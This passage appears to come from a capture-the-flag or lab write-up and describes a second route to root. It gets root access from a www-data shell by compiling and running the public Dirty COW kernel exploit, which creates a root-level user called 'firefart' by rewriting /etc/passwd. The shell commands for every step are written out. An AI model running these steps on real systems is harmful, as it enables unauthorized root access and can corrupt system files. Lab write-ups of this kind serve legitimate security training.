*ALTERNATIVE PRIV ESC*

Once we are in the system as www-data, we can check the kernel version using the following command 

```uname -a```

After a short search, we find that there are some kernel exploits which could work here. One of them is Dirty COW, we will use this one https://github.com/firefart/dirtycow

We compile it using the next command

```cd /tmp && gcc -pthread dirty.c -o dirty -lcrypt && ./dirty rootpass```

Now log in as root (now named firefart)

```su firefart```

```mv /tmp/passwd.bak /etc/passwd```

```id```
